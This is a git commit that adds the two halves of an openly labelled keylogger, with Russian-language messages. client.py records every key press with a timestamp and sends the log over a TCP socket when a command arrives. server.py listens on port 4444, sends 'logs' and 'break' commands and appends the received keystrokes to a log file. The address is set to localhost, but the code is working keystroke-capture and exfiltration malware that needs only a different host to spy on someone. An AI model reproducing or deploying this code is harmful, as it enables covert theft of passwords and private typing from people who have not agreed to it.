fa585c6ba58d3175bb1ae56644c74765fa7d7329
Denis Kulpin <kulpin.denis2009@yandex.ru>
2025-06-27 14:59:29 +0300

    first commit

---
+++ client.py
@@ -0,0 +1,111 @@
+import keyboard
+import os
+import sys
+import socket
+from datetime import datetime
+import time
+import platform
+
+from pystyle import *
+
+
+Success = Colors.green + "[+]" + Colors.reset
+Error = Colors.red + "[-]" + Colors.reset
+Info = Colors.blue + "[*]" + Colors.reset
+
+list = []
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+
+def connect_to_server():
+    try:
+        sock.connect(("127.0.0.1", 4444))
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print(f"{Success} Подключение к серверу произошло успешно!")
+        return True
+    except Exception as e:
+        print(f"Ошибка подключения: {e}")
+        return False
+
+
+def on_key_press(event):
+    time_now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    list.append(f"[{time_now}] {event.name}")
+    print(f"{Info} Записано нажатие: {event.name}")
+
+
+def save_and_send_logs():
+    logs = "\n".join(list)
+    try:
+        sock.sendall(logs.encode())
+        list.clear()
+        print("\n")
+    except Exception as e:
+        print(f"{Error} Ошибка отправки: {e}")
+
+
+def handle_server_commands():
+    while True:
+        try:
+            command = sock.recv(4096).decode().strip()
+            if not command:
+                continue
+            print(f"{Info} Получена команда от сервера: {command}")
+            
+            if command.lower() == "logs":
+                save_and_send_logs()
+            elif command.lower() == "break":
+                print(f"\n{Error} Отключение от сервера...")
+                sock.close()
+                print("")
+                break
+        except Exception as e:
+            print(f"{Error} Ошибка приёма команды: {e}")
+            print("")
+            break
+
+
+def root_check():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+    if os.getuid() != 0:
+        print(f"{Error} Требуются права root!")
+        sys.exit(1)
+    else:
+        pass
+
+
+def platform_system():
+    if platform.system() == "Windows":
+        if not connect_to_server():
+            return
+        
+        keyboard.on_press(on_key_press)
+        
+        time.sleep(2)
+        print(f"\n{Success} Кейлоггер запущен!\n\n")
+        
+        handle_server_commands()
+    else:
+        root_check()
+        if not connect_to_server():
+            return
+        
+        keyboard.on_press(on_key_press)
+        
+        time.sleep(2)
+        print(f"\n{Success} Кейлоггер запущен!\n\n")
+
+        handle_server_commands()
+
+
+def main():
+    platform_system()
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(Colors.green + "\nДо свидания" + Colors.reset)
---
+++ server.py
@@ -0,0 +1,119 @@
+import socket
+import os
+from datetime import datetime
+
+from pystyle import *
+from colorama import Fore, init
+
+
+Success = Colors.green + "[+]" + Colors.reset
+Error = Colors.red + "[-]" + Colors.reset
+Info = Colors.blue + "[*]" + Colors.reset
+
+
+init(autoreset=True)
+
+
+LOG_FILE = os.path.join('logs', 'app.log')
+
+
+def save_to_file(data):
+    try:
+        log_dir = os.path.dirname(LOG_FILE)
+        if log_dir and not os.path.exists(log_dir):
+            os.makedirs(log_dir, exist_ok=True)
+        
+        with open(LOG_FILE, 'a', encoding='utf-8') as f:
+            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            f.write(f"Логи от {timestamp}\n\n")
+            f.write(str(data))
+            f.write("\n\n")
+        
+        print(f"{Success} Логи сохранены в файл: {LOG_FILE}")
+    
+    except PermissionError:
+        print(f"{Error} Ошибка доступа: нет прав для записи в файл {LOG_FILE}")
+    except Exception as e:
+        print(f"{Error} Ошибка при сохранении логов: {str(e)}")
+
+
+def keylogger():
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind(('127.0.0.1', 4444))
+    server.listen(5)
+    print(f"\n{Success} Сервер запущен - (Ожидание подключения...)")
+
+    try:
+        while True:
+            client, addr = server.accept()
+            print(f"\n{Success} Подключен клиент: {addr[0]}:{addr[1]}")
+
+            try:
+                while True:
+                    print("\n[!] logs - Получить логи \n[!] break - Прекратить работу сервера")
+                    command = input(f"\n{Info} Введите команду: ").strip()
+                    
+                    if not command:
+                        continue
+
+                    client.send(command.encode())
+
+                    if command.lower() == 'break':
+                        print(f"\n{Info} Отключение клиента...")
+                        break
+
+                    data = client.recv(4096).decode()
+                    if not data:
+                        print(f"\n{Error} Клиент отключился.")
+                        break
+
+                    print(f"\n{Success} Получены логи от клиента:")
+                    print(f"\n{data}\n")
+                    
+                    save_to_file(data)
+
+            except (ConnectionResetError, BrokenPipeError):
+                print(f"\n{Error} Клиент неожиданно отключился!")
+
+            finally:
+                client.close()
+                print(f"{Info} Соединение с клиентом закрыто.")
+                print("")
+                break
+
+    except KeyboardInterrupt:
+        print(f"\n{Info} Сервер остановлен.")
+        print("")
+    finally:
+        server.close()
+
+
+def display_banner():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(Fore.CYAN + """
+    █████   ████                     █████                                                    
+    ░░███   ███░                     ░░███                                                     
+    ░███  ███     ██████  █████ ████ ░███         ██████   ███████  ███████  ██████  ████████ 
+    ░███████     ███░░███░░███ ░███  ░███        ███░░███ ███░░███ ███░░███ ███░░███░░███░░███
+    ░███░░███   ░███████  ░███ ░███  ░███       ░███ ░███░███ ░███░███ ░███░███████  ░███ ░░░ 
+    ░███ ░░███  ░███░░░   ░███ ░███  ░███      █░███ ░███░███ ░███░███ ░███░███░░░   ░███     
+    █████ ░░████░░██████  ░░███████  ███████████░░██████ ░░███████░░███████░░██████  █████    
+    ░░░░░   ░░░░  ░░░░░░    ░░░░░███ ░░░░░░░░░░░  ░░░░░░   ░░░░░███ ░░░░░███ ░░░░░░  ░░░░░     
+                            ███ ░███                       ███ ░███ ███ ░███                   
+                            ░░██████                       ░░██████ ░░██████                    
+                            ░░░░░░                         ░░░░░░   ░░░░░░                     
+
+                                [https://github.com/DenisPythoneer]                                                                                     
+    """)
+
+
+def main():
+    display_banner()
+    keylogger()
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(Colors.green + "\nДо свидания!" + Colors.reset)
